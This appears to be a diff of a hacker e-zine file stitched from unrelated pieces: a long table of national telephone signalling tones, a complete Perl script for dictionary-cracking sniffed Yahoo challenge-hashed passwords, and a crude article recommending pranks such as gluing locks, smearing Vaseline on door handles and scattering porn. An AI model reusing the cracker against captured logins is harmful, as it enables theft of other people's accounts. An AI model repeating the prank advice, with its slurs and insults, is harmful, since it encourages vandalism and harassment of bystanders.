+	Special information tone -	950/1400/1800	(3x0.33 on 2x0.03 off)
+                                                                      1.0 off
+	Call waiting tone -	450	0.1 on 0.2 off 0.1 on 9.5 off
+
+Kyrgyz Republic
+	Busy tone -	425	0.4 on 0.4 off
+	Congestion tone -	425	0.4 on 0.4 off
+	Number unobtainable tone -	425	0.4 on 0.4 off
+	Ringing tone -	425	0.8 on 3.2 off
+
+Slovak Republic
+	Busy tone -	425	0.33 on 0.33 off
+	Congestion tone -	425	0.165 on 0.165 off
+	Conference tone -	425	0.66 on
+	Dial tone - I	425	0.33 on 0.33 off 0.66 on 0.66 off
+	Dial tone - II (pabx)	425	continuous
+        Special dial tone -     425   3x(0.165 on 0.165 off) 0.660 on 0.660 off
+	Offering tone, trunk -	425	0.33 on 0.33 off 0.33 on 1.50 off
+	Pay tone - I (cards)	622	0.125 on 0.125 off
+	Pay tone - II (coins)	941	0.2 on 0.2 off 0.2 on 3.6 off
+	Ringing tone -	425	1.0 on 4.0 off
+        Special information tone -950/1400/1800 (3x0.33 on 2x0.03 off) 1.00 on
+	Call waiting tone -	425	0.33 on 9.0 off
+	Caller waiting tone -	425	1.00 on 0.17 off 0.33 on 3.50 off
+
+Czech Republic
+	Busy tone -	425	0.33 on 0.33 off
+	Connection tone -	1400	0.05 on 0.05 off
+	Congestion tone -	425	0.165 on 0.165 off
+	Dial tone -	425	0.33 on 0.33 off 0.66 on 0.66 off
+	Ringing tone -	425	1.0 on 4.0 off
+        Special information tone -  950/1400/1800(3x0.33 on 2x0.03 off) 1.0 off
+	Call waiting tone -	425	0.33 on 9.0 off
+	Caller waiting tone -	425	1.00 on 0.17 off 0.33 on 3.50 off
+
+Reunion (French Department of)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.5 on 3.5 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off
+                                                        0.3 on 8.0 off)
+Romania
+	Busy tone -	133//450	0.15 on 0.20 off
+	Dial tone -	400//450	continuous
+	Number unobtainable tone -	400//450	6x(0.033 on 0.03 off)
+                                                         0.1 on 0.03 off
+	Ringing tone -	400x16//450x25	2.0 on 4.0 off
+
+United Kingdom of Great Britain and Northern Ireland
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.4 on 0.35 off 0.225 on 0.525 off
+	Dial tone -	50//350+440	continuous
+	Number unobtainable tone -	400	continuous
+	Pay tone -	400	0.125 on 0.125 off
+        Payphone recognition tone -     1200/800  0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	400+450//400x25//400x1	0.4 on 0.2 off 0.4 on 2.0 off
+	6 2/3
+
+Russian Federation
+	Busy tone -	425	0.4 on 0.4 off
+	Ringing tone -	425	0.8 on 3.2 off
+	Waiting tone -	950/1400/1800	3x0.333 on 1.0 off
+
+Rwandese Republic
+	Busy tone -	440	0.5 on 0.5 off
+	Congestion tone -	announcement
+	Dial tone -	440	continuous
+	Second dial tone -	340	continuous
+	Pay tone -	12000	0.125 on
+	Ringing tone -	440	1.7 on 3.3 off
+	Route tone -	440	0.05 on 0.05 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+
+Saint Kitts and Nevis
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Recall dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Number unobtainable tone -	480+620	0.25 on 0.25 off
+        Payphone recognition tone -     1600/1143 0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+        Warning tone -operator intervening  450  0.2 on 0.2 off 0.65 on 0.2 off
+	Waiting tone -	440	1x(0.5 on 10.0 off 0.5 on)
+
+San Marino (Republic of)
+	Busy tone -	425	0.2 on 0.2 off
+	Dial tone -	425	0.6 on 1.0 off 0.2 on 0.2 off
+	Ringing tone -	425	1.0 on 4.0 off
+
+Saint Pierre and Miquelon (Collectivité territoriale de la République française)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330+440	continuous
+	Ringing tone -	440	1.5 on 3.5 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+	Call waiting tone -	440	2x(0.3 on 8.0 off 0.4 on 8.0 off 0.3 on
+                                                                 8.0 off)
+Saint Vincent and the Grenadines
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.40 on 0.35 off 0.225 on 0.525 off
+	Dial tone - I	350+450	continuous
+	Dial tone - II	350+450	0.75 on 0.75 off
+	Pay tone -	400	0.125 on 0.125 off
+	Ringing tone -	400+450	0.4 on 0.2 off
+	Special information tone -	950/1400/1800	3x(0.33 on 1.0 off)
+	Call waiting tone -	400	0.1 on 5.0 off
+
+Saint Helena
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	400	0.4 on 0.35 off
+	Dial tone -	350+400	continuous
+	Number unobtainable tone -	400	continuous
+	Pay tone -	400	0.125 on 0.125 off
+	Ringing tone -	400+450	0.4 on 0.2 off
+
+Saint Lucia
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Special dial tone -	425+330	continuous
+	Pay tone -	622	0.136 on 0.136 off
+	Ringing tone -	425	0.375 on 0.25 off 0.375 on 2.0 off
+	Route tone -	425	0.05 on 0.05 off
+	Warning tone -	425	0.1 on 4.9 off
+	Call waiting tone -	425	0.2 on 0.2 off 0.2 on 4.0 off
+
+Solomon Islands
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.1 on 0.1 off
+	Dial tone -	400	continuous
+	Number unobtainable tone -	400	0.075 on 0.1 off
+	Pay tone -	852	0.2 on 2.0 off
+	Ringing tone -	400+450	0.4 on 0.2 off
+	Waiting tone -	400+450/400	0.5 on 0.5 off
+
+Western Samoa (Independent State of)
+	Congestion tone -	announcement
+	Dial tone -	425	continuous
+	Number unobtainable tone -	announcement
+	Ringing tone -	425x25	0.375 on 0.25 off 0.375 on 2.0 off
+
+Sao Tome and Principe (Democratic Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Pay tone -	12000	continuous
+	Ringing tone -	425	1.0 on 5.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	425	0.2 on 1.0 off
+
+Senegal (Republic of)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440	continuous
+	Ringing tone -	400	1.7 on 3.3 off
+	Special information tone -	900/1380/1860	0.35 on 0.30 on 0.35 on
+
+Seychelles (Republic of)
+	Busy tone -	425	0.375 on 0.375 off
+	Congestion tone -	425	0.4 on 0.2 off 0.225 on 0.525 off
+	Dial tone -	440+350	continuous
+	Special dial tone -	425	1.0 on 0.1 off
+	Facilities tone -	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Howler tone -	3000	continuous
+	Number unobtainable tone -	425	continuous
+	Ringing tone -	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Route tone -	425	0.5 on 0.5 off
+	Special information tone -	900/1400/1800	3x0.33 on 1.0 off
+	Test number tone -	800//1900	continuous
+	Call waiting tone -	425	3x(0.3 on 9.7 off)
+
+Sierra Leone
+	Busy tone -	425//450	0.5 on 0.5 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425//450	continuous
+	Number unobtainable tone -	950//450/150	0.33 on 0.03 off
+	Ringing tone -	425//450	1.0 on 4.0 off
+	Waiting tone -	425	1x(1.0 on)
+
+Singapore (Republic of)
+	Busy tone -	425	0.75 on 0.75 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Ringing tone -	425x24	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.00 off
+	Call waiting tone -	425	0.3 on 0.2 off 0.3 on 3.2 off
+
+Slovenia (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	0.2 on 0.3 off 0.7 on 0.8 off
+	Special dial tone -	425	continuous
+	Offering tone, trunk -	425	0.2 on 0.3 off 0.7 on 0.8 off
+	Pay tone -	425	0.5 on 15.0 off
+	Payphone recognition tone -	1100+1750/750+1450	0.2 on 0.2 off
+                                                                0.2 on 2.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.00 off
+	Call waiting tone -	425	0.3 on 10.0 off
+
+Sri Lanka (Democratic Socialist Republic of)
+	Busy tone -	425	0.75 on 0.75 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Holding tone -	425	0.5 on 2.5 off
+	Intrusion tone -	425	0.5 on 0.75 off
+	Number unobtainable tone -	425+330	continuous
+	Ringing tone -	425	0.4 on 0.2 off 0.4 on 2.0 off
+	Route tone -	425	0.05 on 0.05 off
+	Special information tone -	950/1400/1800	(3x0.33 on 2x 0.03 off)
+	Warning tone -	425	0.5 on 4.5 off
+	Call waiting tone -	425	0.5 on 2.5 off
+
+South Africa (Republic of)
+	Busy tone -	400	0.5 on 0.5 off
+        Comfort tone -  950/950/1400   0.65 on 0.325 off 0.325 on 1.3 on 2.6off
+	Congestion tone -	400	0.25 on 0.25 off
+	Dial tone -	400x33	continuous
+	Special dial tone -	400x33	0.25 on 0.25 off + continuous
+        Function acknowledge tone - 700/1100  0.25 on 0.25 off 0.25 on 0.25 off
+	Intrusion tone -	400	0.15 on 0.25 off 0.15 on 1.45 off
+	Notify tone -	900	0.2 on 0.2 off 0.2 on 0.2 off
+	Number unobtainable tone -	400	2.5 on 0.5 off
+	Ringing tone -	400x33	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	400x33	0.4 on 4.0 off
+
+Sweden
+	Busy tone - I	425	0.25 on 0.25 off
+	Busy tone - II (1)	425	0.5 on 0.5 off
+	Congestion tone - I	425	0.25 on 0.75 off
+	Congestion tone - II (1)	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Second dial tone -	425	continuous
+	Special dial tone -	425	0.32 on 0.02 off
+	Pay tone -	941	2x(0.2 on 0.2 off 0.2 on 3.6 off)
+	Payphone recognition tone -	1477/941	11x(0.2 on 0.2 off
+                                                             0.2 on 2.0 off)
+	Ringing tone - I	425	1.0 on 5.0 off
+	Ringing tone - II (1)	425	1.0 on 4.0 off
+	Ringing tone - III (5)(9)	400	1.0 on 9.0 off
+	Special information tone - I	950/1400/1800	3x0.33 on 1.0 off
+                                                        + announcement
+	Special information tone - II (5)(9)	400	3x(0.05 on 0.2 off)
+                                                        0.6 on 0.2 off
+	Warning tone - operator intervening	1400	0.1 on 1.5 off
+	Warning tone - three party conference	1400	0.35 on 15.0 off
+        Warning tone - time limit barring     425   2.0 on 5.0 off + continuous
+	Call waiting tone - I	425	1x(0.2 on 0.5 off 0.2 on)
+	Call waiting tone - II (1)	425	0.2 on 0.6 off 0.2 on 3.0 off
+                                                0.2 on 0.6 off 0.2 on
+Switzerland (Confederation of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.2 on 0.2 off
+	Dial tone -	425	continuous
+	Special dial tone -	425+340	1.1 on 1.1 off
+	Intrusion tone -	1400	0.2 on 2.0 off
+	Pay tone -	1200	1.0 on
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Warning tone -	1400	0.45 on 15.0 off
+	Call waiting tone -	425	0.2 on 0.2 off 0.2 on 4.0 off
+
+Suriname (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Ringing tone -	425	4.0 on 1.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+
+Swaziland (Kingdom of)
+	Busy tone - I	400	0.5 on 0.5 off
+	Busy tone - II	400	0.4 on 0.4 off
+	Dial tone -	50	continuous
+	Number unobtainable tone -	400	4.8 on 0.2 off
+	Pay tone -	900	0.25 on 0.25 off
+	Payphone recognition tone - I	1430/943	2.0 on 2.0 off
+	Payphone recognition tone - II	1100+1750/750+1450	0.2 on 0.2 off
+                                                                0.2 on 2.0 off
+	Ringing tone -	400	0.4 on 0.2 off 0.4 on 4.0 off
+
+Tajikistan (Republic of)
+	Busy tone -	425	0.4 on 0.4 off
+	Congestion tone -	425	0.4 on 0.4 off
+	Dial tone -	425	continuous
+	Pay tone -	1400	1.0 on 1.0 off
+	Ringing tone -	425	0.8 on 3.2 off
+	Special information tone -	425	continuous
+	Call waiting tone -	950/1400/1800	0.8 on 3.2 off
+
+Taiwan, China
+	Busy tone -	480+620	0.5 on 0.5 off
+	Dial tone -	350+440	continuous
+	Special dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Ringing tone -	440+480	1.0 on 2.0 off
+	Re-order tone -	480+620	0.25 on 0.25 off
+	Warning tone -	392/494/587	2x(0.5 on 0.5 on 1.5 on)
+	Call waiting tone - I	440+480	1.5 on
+	Call waiting tone - II	350+440	0.25 on 0.25 off 0.25 on 5.25 off
+
+Tanzania (United Republic of)
+	Acceptance tone -	425	continuous
+	Busy tone - I	425	1.0 on 1.0 off
+	Busy tone - II	400	0.5 on 0.5 off
+	Congestion tone - I	425	0.375 on 0.375 off
+	Congestion tone - II	400	0.25 on 0.25 off
+	Dial tone -	425//400	continuous
+	Intrusion tone -	425	0.05 on 0.20 off
+	Pay tone -	1100+1750//750+1450	0.2 on 0.2 off
+	Refusal tone -	425	1.0 on 1.0 off
+	Ringing tone - I	425	1.0 on 4.0 off
+	Ringing tone - II	400	0.4 on 0.2 off 0.4 on 2.0 off
+	Special information tone - I	950/1400/1800	0.375 on 0.03 off
+                                                     0.375 on 0.03 off 0.375 on
+	Special information tone - II	950/1400/1800	3x0.33 on 1.0 off
+	Test number tone -	2010	continuous
+	Call waiting tone - I	425	0.05 on 0.20 off
+	Call waiting tone - II	400	0.4 on 0.2 off
+
+
+Chad (Republic of)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440	continuous
+	Second dial tone -	330+400	continuous
+	Ringing tone -	440	1.7 on 3.3 off
+	Special information tone -	950/1400/1800	(3x0.33 on 2x0.03 off)
+                                                         1.0 off
+Thailand
+	Busy tone -	400	0.5 on 0.5 off
+	Congestion tone -	400	0.3 on 0.3 off
+	Dial tone -	400x50	continuous
+	Ringing tone -	400	1.0 on 4.0 off
+	Special information tone -	announcement
+	Call waiting tone -	400	1.0 on 10.0 off 1.0 on
+
+Trinidad and Tobago
+	Busy tone -	480+620	0.5 on 0.5 off
+	Dial tone -	350+440	continuous
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Re-order tone - I	480+620	0.3 on 0.2 off
+	Re-order tone - II (8)	480+620	0.2 on 0.3 off
+	Waiting tone -	440	0.3 on 10.0 off
+
+Tunisia
+	Busy tone -	425	0.25 on 0.25 off
+	Congestion tone -	425	0.167 on 0.167 off
+	Dial tone -	425	continuous
+	Pay tone -	12000	0.125 on
+	Ringing tone -	425	1.20 on 4.65 off
+        Special information tone -  900/1400/1800(3x0.33 on 2x0.03 off) 1.0 off
+	Call waiting tone -	425	0.2 on 0.6 off
+
+Turkmenistan
+	Busy tone -	425	0.4 on 0.4 off
+	Congestion tone -	425	0.4 on 0.4 off
+	Dial tone -	425	continuous
+	Second dial tone -	425	continuous
+	Number unobtainable tone -	425	0.8 on 4.0 off
+	Ringing tone -	25	0.4 on 4.0 off
+	Route tone -	25	0.4 on 0.4 off
+
+Turks and Caicos Islands
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Recall dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Number unobtainable tone -	480+620	0.25 on 0.25 off
+        Payphone recognition tone -     1600/1143 0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+        Warning tone - operator intervening  450 0.2 on 0.2 off 0.65 on 0.2 off
+	Waiting tone -	440	1x(0.5 on 10.0 off 0.5 on)
+
+Turkey
+	Busy tone -	450	0.5 on 0.5 off
+	Confirmation tone -	450	0.04 on 0.04 off
+	Congestion tone -	450	3x(0.2 on 0.2 off) 0.6 on 0.2 off
+	Dial tone -	450	1.00 on 0.25 off
+	Number unobtainable tone -	450	0.2 on 0.2 off
+	Ringing tone -	450	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.3 on 1.0 off
+        Warning tone - operator intervening   450 0.2 on 0.2 off 0.6 on 0.2 off
+	Waiting tone - I	350+450	0.5 on 0.5 off
+	Waiting tone - II	450	0.5 on 2.5 off
+	Call waiting tone -	450	0.2 on 0.6 off 0.2 on 8.0 off
+
+Uruguay (Eastern Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone - I	425	continuous
+	Dial tone - II	450	0.7 on 0.8 off 0.2 on 0.3 off
+	Negative indication tone -	425	0.5 on 0.5 off
+	Positive indication tone -	425	2x(0.1 on 0.2 off) 0.1 on 1.3 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Warning tone - operator intervening	425	0.15 on 0.25 off
+                                                        0.15 on 1.45 off
+	Waiting tone -	425	0.2 on 0.2 off 0.2 on 4.4 off
+
+Vanuatu (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.5 on 0.5 off
+	Dial tone -	425	continuous
+	Pay tone -	1477/941	0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+        Special information tone -      950/1400/1800   3x0.33 on
+                                                        2x0.03 off 1.0 off
+	Call waiting tone -	425	0.3 on 10.0 off
+
+Venezuela (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Confirmation tone -	425	0.1 on 0.1 off 0.3 on 0.1 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Howler tone -	1440	0.5 on 0.5 off
+	Pay tone -	800	1.0 on 15.0 off
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1440/1800	3x0.33 on 1.0 off
+	Call waiting tone -	400/450	0.3 on 6.0 off
+	Caller waiting tone -	425	1.0 on 4.0 off
+
+British Virgin Islands
+	Busy tone -	480+620	0.5 on 0.5 off
+	Congestion tone -	480+620	0.25 on 0.25 off
+	Dial tone -	350+440	continuous
+	Recall dial tone -	350+440	3x(0.1 on 0.1 off) + continuous
+	Number unobtainable tone -	480+620	0.25 on 0.25 off
+        Payphone recognition tone -     1600/1143 0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	440+480	2.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+        Warning tone - operator intervening   450 0.2 on 0.2 off 0.65 on 0.2 off
+	Call waiting tone -	440	1x(0.5 on 10.0 off 0.5 on)
+
+Wallis and Futuna (Territoire français d'outre-mer)
+	Busy tone -	440	0.5 on 0.5 off
+	Dial tone -	440//330	continuous
+	Pay tone -	12000	0.1 on
+	Ringing tone -	440	1.5 on 3.5 off
+	Route tone -	440	0.05 on 0.05 off
+        Special information tone -  950/1400/1800(3x0.3 on 2x0.03 off) 1.0 off
+
+Yugoslavia (Federal Republic of)
+	Busy tone - I	425	0.5 on 0.5 off
+	Busy tone - II	425	0.2 on 0.4 off
+	Dial tone -	425	0.7 on 0.8 off 0.2 on 0.3 off
+	Ringing tone - I	450x25	1.0 on 9.0 off
+	Ringing tone - II	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+
+Zambia (Republic of)
+	Busy tone -	425	0.5 on 0.5 off
+	Congestion tone -	425	0.25 on 0.25 off
+	Dial tone -	425	continuous
+	Pay tone -	800	2.0 on
+	Payphone recognition tone -	1600	0.1 on
+	Ringing tone -	425	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.333 on 1.0 off
+	Call waiting tone -	425	0.1 on 4.9 off
+
+Zimbabwe (Republic of)
+	Busy tone -	400	0.375 on 0.375 off
+	Congestion tone -	425	0.167 on 0.167 off
+	Dial tone -	425	continuous
+	Pay tone -	1500+1000	0.2 on 0.2 off 0.2 on 2.0 off
+	Ringing tone -	450	1.0 on 4.0 off
+	Special information tone -	950/1400/1800	3x0.33 on 1.0 off
+	Call waiting tone -	523//659	1.5 on 1.5 off
+
+*******************************************************************************
+1      For PLMN/GSM.
+2	This tone is used within the supplementary service 'Call Waiting' the
+        duration is 30 seconds.
+3	This tone is also used in private automatic branch exchanges (PABX).
+4	This tone bursts every 15 seconds.
+5	Analogue exchanges.
+6	Two bursts, ten seconds apart.
+7	Special dial tone is used when call transfer is active.
+8	Trunk.
+9	Until 1998/1999.
+*******************************************************************************
+
+Explanation of symbols
+Frequency in Hz:	f1×f2	f1 is modulated by f2
+f1+f2	the juxtaposition of two frequencies f1 and f2 without modulation
+f1/f2	f1 is followed by f2
+f1//f2	in some exchanges frequency f1 is used and in others frequency f2 is
+        used.
+
+04/13/03
+
+EOF
+
+
+ --
+
+
+ [ Perl Code for Security Auditing Yahoo E-mail Passwords ]
+
+ 
+ #!/usr/bin/perl
+#   
+#    By: GrassMunk
+#
+#   	||Info//Background||
+#        This program uses a dictionary file to crack sniffed yahoo passwords.
+#        ( like those seen from Dsniff )
+#        
+#        //Code from Yahoo login page
+#        var passwd = form.passwd.value;
+#              var hash1 = MD5(form.passwd.value);
+#              var challenge = form[".challenge"].value;
+#              var hash2 = MD5(form.passwd.value) + challenge;
+#              var hash;
+#              if(form.passwd.value){
+#                hash=MD5(hash2);
+#              }
+#        as you can see the above code is used to create a hash value for
+#        your password so that  its not sent  plaintext over the internet. 
+#        This is great, but  scince we want to know  what the clear  text 
+#        password is we use this program to calculate it.
+#
+#        OK, next you may say "Why would i use this when MD5 Crack programs
+#        exist?" Well smart ass ill tell you why, you see that extra "+ challenge"
+#        up there, its adding a "nonce" (look it up) to add an extra level of
+#        'security'. What this means is that MD5 Crack won't work because it
+#        doesnt use the nonce to crack the MD5 password.
+#
+#	||Usage||
+#	 ./YahooPWD.pl -p <sniffed pwd> -c <challenge> -d <dictionary file>
+#
+#        ||Note|| 
+#         The dictionary file must have each individual word on a seperate line. 
+#         A good example are the files from:
+#	  http://www.mirrors.wiretapped.net/security/info/reference/wordlists/ 
+#	  It will not work properlly if the words are all on one line and are
+#	  seperated by a coma, space etc.
+#
+#
+#     	||DISCLAIMER||
+#	 This program comes with NO guaruntee ( or spell checker ). You are 
+#	 free to use it however you want but I don't guaruntee that it will
+#	 work forever. Infact it wouldn't take much on Yahoos' side to make 
+#	 this script unusable. Also, if this script causes ANY harm to your 
+#	 computer I can in no way  be held responsible. Youve gotta be some 
+#	 kind of stupid to be able to  break your hardware with this little
+#	 script. But I  cannot be blamed for  anything you do so don't even
+#	 bother.
+#
+#	
+
+
+use Digest::MD5  qw(md5_hex);
+use Term::ANSIColor; # This is used to add some colour. You dont like it? then
+add a # to this line and every line that begins with ' print color ' Theres
+alot of em :) use Getopt::Std;
+
+my $challenge;
+my $Password;
+my $guessword;
+my $counter=0;
+
+#Print Header
+print color 'bold yellow';
+print "\n--\t $0 \t\t--\n--\tMaker:";
+print color 'bold green';
+print " GrassMunk\t";
+print color 'bold yellow';
+print "--\n";
+#Print Usage if no arguments are supplied
+if (! defined $ARGV[0]) {
+        print color 'bold blue';
+        print "\nUsage: ";
+        print color 'bold yellow';
+        print "$0 ";
+	print color 'bold red';
+	print "-p <sniffed pwd> -c <challenge> -d <dictionary file> ";
+        print " \n\n";
+        print color 'reset';
+        exit 0;
+}
+
+# get the options from the console
+getopts('c:p:d:');
+
+$challenge = $opt_c;
+$Password = $opt_p;
+$dictionary = $opt_d;
+
+
+        print "Using dictionary file: $dictionary\n";
+        open(DICTIONARY, $dictionary) || die("Could not open file $dictionary.
+	Maybe the path is wrong or you do not have read permission. Error: $! \n");
+
+
+while($guessword = <DICTIONARY>) {
+	s/#.*//;            		# ignore comments by erasing them
+	chomp($guessword);  		# remove newlines	
+	$digest = md5_hex($guessword); 	# Create digest
+	$digest .= $challenge;		# add the challenge to it
+	$digest = md5_hex($digest);	# re-Create it
+
+
+	if($digest eq $Password) { 
+		print color 'bold red';
+		print "Password Found\n";
+		print color 'bold white';
+		print "The Password is: $guessword\n";
+		print "\n";
+		print color 'reset';
+		close(DICTIONARY);
+		exit 0;
+	}
+	if(!($counter % 10000) ) {		
+		# Print the word on every 10 000th line
+		print color 'bold green';
+		print "Word #$counter \t";
+		print color 'bold blue';
+		print "$digest";
+		print color 'bold green';
+		print " :: ";
+		print color 'bold white';
+		print "$guessword\n";
+
+
+	}
+	$counter++;
+}
+
+print "\n";
+ print color 'reset';
+close(DICTIONARY);
+#EOF
+
+
+--
+
+<pnp> mike tyson cohosting jimmy kimmel ... its like
+      watching a special olympics philosophy event
+
+
+-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=
+         ,)(8)).              -=[ Fucking With Peoples Sensibilities ]=-
+       (()))())()).
+      (()"````"::= )          -- Part 1 "Introfuction" --
+      )| _    _ ::= )
+     (()(o)/ (o) ?(/)         Author: caesium & Coercion
+      )(::c ::.( :(/)   -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-
+     (( \ .__. ;,/(/)
+       ) `.___,'/ (/)      -=[ Intro ]=-
+          |    | (/)
+        _.'    ,\(/)__     You may say "fuck man, another stupid article", Well
+    _.-"   ` u    (/) ".   your 100% totally correct. However, this article is
+  ,"               ^    \  sans-urine + coffee grinds.. Which is good.. (no
+ /                      |  offense phlux, closet article owned btw).. Please
+ |           .      `.  |  read this before you rub one off to the hot ascii
+ |   /,'   _  `.'   _ `.|  chick to the immediate left. (you know you want to).
+ |   ||   (o)  |   (o) ||
+ |   |\        ;       /)  This article is going to discuss various ideas on
+ (   \ `.,___,' `.,__,'/   how to fuck with peoples sensibilities such as their
+  \   \ |           | /    ideals, time, ego, intellegence and most of all
+   \   `;           |/     their pride.
+    `. /            |
+jr    Y             |      -=[ Example ]=-
+ cj  /          (   |
+    /               ;      Here is a real life example of fucking with someones
+   /               /       sensibilities. Albiet a generic unoriginal method,
+  ;       ` .    ,'(       it is still however, fucking hularious! (keep in
+  |          \##'   \      mind this is a TRUE example... ^_^)
+  :           Y      \
+   \           \      \    Well, I was at a mall with a peep. We brought along
+    \           \      \   a twonie and a thing of super glue (krazy glue). We
+     \           \      \  proceeded to glue this coin to the floor. Holding
+the coin to the floor under my shoe for several minutes until I was satified
+that said coin was a new addition to what is the floor. Once that fucker was
+cemented to the floor, we retired to a near-by bench to sit, watch and enjoy
+our orange julius smoothies. We were soon not disapointed.
+
+Several people came by, spent a few minutes trying to pick it up, then kick it
+in a cheap attempt to get the coin unstuck. Some instantly knew it was a total
+fucking joke and looked around then left with some of their pride still intact.
+Others spent several minutes and one cheap fucker actually tryed to pry it off
+the floor with what looked like his car key. Eventually they all gave up.
+
+Except for this one pudgy motherfucker. This fucking sad excuse for a cheap
+human being spent ten long minutes doing everything in his power to pry this
+coin up, except use his fucking teeth. He soon left. Then, in total disbelief
+he returns like 15-20 minutes later just as we were about to leave, with a
+fucking hammer. Picture this, a fat kid, in a mall, with a hammer, smacking a
+glued down twonie. Well, he got his fucking twonie, at the cost of what was
+pride and common sense. And this kid was fucking 14 to 16.. It was indeed a
+sad moment for the human race. And was pretty damn funny at that.
+
+This is what its all about people. Making sensible people do unsensable things.
+Not to say that, that dumb fuck was in any way sensible to begin with. Anyhow,
+I digress.
+
+-=[ Ideas ]=-
+
+These ideas have been time tested and are true. They work.. (cept the cocktail)
+
+*Stickey things in unexpected places
+  Vaseline behind a door handle of a shop or apartment lobby door can be quite
+  the unexpected surprise to your neighbours or any other fucker you dont much
+  appreciate. If it moves, GLUE IT.. Nothing pisses people off more than
+  something which should move, but doesnt.. If its a lock, GLUE IT. If its a
+  button, RUB SHIT ON IT. If you have a dog, YOU MUST WHIP IT. WHIP IT GOOD!
+
+*Disgusting porn in unexpected places
+  Here's what I did once at a friends building. We printed off some she-male
+  porn, yah know. Chicks with dicks.. Full page, Black and white and a color
+  one before my buddies color ink ran out. We folded it up. And scattered it
+  all about his apartment lobby. We then watched the lobby security cam via
+  channel 74 on his cable (which provided more entertainment than I can
+  possibly tell in even 2 k-1ine's). We saw some kids come by, pick it up, toss
+  it to the ground and leave. Then we eventually saw some chienese guy pickup
+  this disgusting shit, and then do what can only be described as appreciating
+  the fine qualities of these penis toting biatches. His eyes then shifted from
+  left to right, and so several times to ensure the coast was clear. This
+  obviously indecates he knows damn well he is a suck motherfucker. Then he
+  folded the print-out up and put it in his pocket. By this time, I have
+  already soiled myself in what was the best laugh Ive had all damn month.
+
+*Ordering Pizza's to Rival Pizza Places
+  One night coercion, grinthock and myself were rather bored and chillin out
+  at grints place. We had a few drinks, so we were feeling pretty flexible. And
+  we were looking for some mild entertainment. We then decided to lodge several
+  prank calls to a popular pizza chain in Ontario. Then it occured to us to
+  order a pizza from one pizza place to another rival pizza place. So, we
+  got 2 pizza places and their respective addresses. We then called place A and
+  ordered a pizza to be delivered to place B. After that, we called Place B and
+  ordered a pizza to be delivered to place A. So, A will deliver to B and B to
